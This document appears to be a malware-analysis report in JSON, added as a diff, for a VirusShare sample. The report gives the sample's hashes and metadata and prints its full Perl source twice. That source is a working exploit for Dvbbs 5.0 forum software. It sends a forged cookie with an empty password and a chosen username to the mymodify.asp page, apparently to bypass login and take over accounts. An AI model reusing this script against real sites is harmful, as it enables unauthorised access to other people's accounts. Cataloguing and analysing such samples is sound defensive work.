@@ -1,0 +1,70 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "#!/usr/bin/perl\n#Dvbbs5.0 test the script,  Bug find by analysist\n#Code by wawa@21cn.com\n#Welcom To Http://www.Haowawa.com/\n\nuse IO::Socket;\n\nsystem('cls'); \n$ARGC = @ARGV; \nif ($ARGC != 3) { \nprint \"\\n\";\nprint \"*****************************************************\\n\";\nprint \"Dvbbs5.0 test the script  Bug find by analysist\\n\";\nprint \"Code by wawa   Http://www.Haowawa.com/\\n\";\nprint \"Usage: dvbbs.pl <host> <name> <way>\\n\"; \nprint \"Example: dvbbs.pl 127.0.0.1 wawa /bbs/mymodify.asp\\n\";\nprint \"*****************************************************\\n\"; \nexit(1); \n} \n\n$host = @ARGV[0];\n$name = @ARGV[1];\n$way = @ARGV[2];\n\n#you change ???\n$port = 80;   \n\n$req = \"GET $way HTTP/1.0\\n\".\n       \"Host: $host\\n\".\n       \"Referer: $host\\n\".\n       \"Cookie: iscookies=1;aspsky=password=&username=$name\\n\\n\";\n\n@res = &connect;\nprint @res;\n\nsub connect {\nmy $connection = IO::Socket::INET->new(Proto =>\"tcp\",\n                                PeerAddr =>$host,\n                                PeerPort =>$port) || die \"Sorry! Could not connect to $host \\n\";\n\nprint $connection $req;\nmy @res = <$connection>; \nclose $connection;\nreturn @res;\n}\n \n\n\n\n\n\n\n\n"
+    },
+    "filename": "VirusShare_09a142e3e7852c7ceab497d05efd26cc",
+    "filesize": 1197,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "09a142e3e7852c7ceab497d05efd26cc",
+        "sha1": "b3b8cf9e30bced7c12022bbc2c037f9470b19fbe",
+        "sha256": "3ac9f606d1729eda2b12e4858f52bfe5c13daef0ea67201735c2652f7e00b116"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "#Dvbbs5.0 test the script,  Bug find by analysist",
+            "#Code by wawa@21cn.com",
+            "#Welcom To Http://www.Haowawa.com/",
+            "use IO::Socket;",
+            "system('cls'); ",
+            "$ARGC = @ARGV; ",
+            "if ($ARGC != 3) { ",
+            "print \"\\n\";",
+            "print \"*****************************************************\\n\";",
+            "print \"Dvbbs5.0 test the script  Bug find by analysist\\n\";",
+            "print \"Code by wawa   Http://www.Haowawa.com/\\n\";",
+            "print \"Usage: dvbbs.pl <host> <name> <way>\\n\"; ",
+            "print \"Example: dvbbs.pl 127.0.0.1 wawa /bbs/mymodify.asp\\n\";",
+            "print \"*****************************************************\\n\"; ",
+            "exit(1); ",
+            "$host = @ARGV[0];",
+            "$name = @ARGV[1];",
+            "$way = @ARGV[2];",
+            "#you change ???",
+            "$port = 80;   ",
+            "$req = \"GET $way HTTP/1.0\\n\".",
+            "       \"Host: $host\\n\".",
+            "       \"Referer: $host\\n\".",
+            "       \"Cookie: iscookies=1;aspsky=password=&username=$name\\n\\n\";",
+            "@res = &connect;",
+            "print @res;",
+            "sub connect {",
+            "my $connection = IO::Socket::INET->new(Proto =>\"tcp\",",
+            "                                PeerAddr =>$host,",
+            "                                PeerPort =>$port) || die \"Sorry! Could not connect to $host \\n\";",
+            "print $connection $req;",
+            "my @res = <$connection>; ",
+            "close $connection;",
+            "return @res;"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "127.0.0.1"
+        ],
+        "url": []
+    },
+    "time": "0:00:00.267798",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
